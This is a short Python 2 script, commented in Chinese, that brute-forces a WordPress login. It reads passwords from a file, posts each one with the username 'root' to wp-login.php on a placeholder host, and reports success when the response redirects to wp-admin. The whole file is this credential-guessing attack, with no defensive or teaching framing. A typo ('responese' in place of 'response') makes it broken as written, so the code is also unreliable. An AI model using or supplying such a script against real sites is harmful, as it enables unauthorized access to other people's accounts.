import urllib, urllib2, cookielib


#  urllib连接并进行密码测试
url = "http://server/wordpress/wp-login.php"
user_login = "root"
headers = {"User-Agent": "Mozilla/4.0"}

with open("password.txt", "r") as f:
	passwords = f.readlines()

	for password in passwords:
		password = password.strip()
		values = {"log": user_login, "pwd": password}
		data = urllib.urlencode(values)
		request = urllib2.Request(url, data, headers)
		response = urllib2.urlopen(request)

		try:
			idx = responese.geturl().index("wp-admin")
		except :
			idx = 0
		if idx > 0:
			print("success:" + password)
			break
		else:
			print("failed:" + password)

print("URL: %s" % responese.geturl())
print("CODE: %s" % responese.getcode())
print("INFO: %s" % responese.info())
print("DATA: %s" % responese.read())



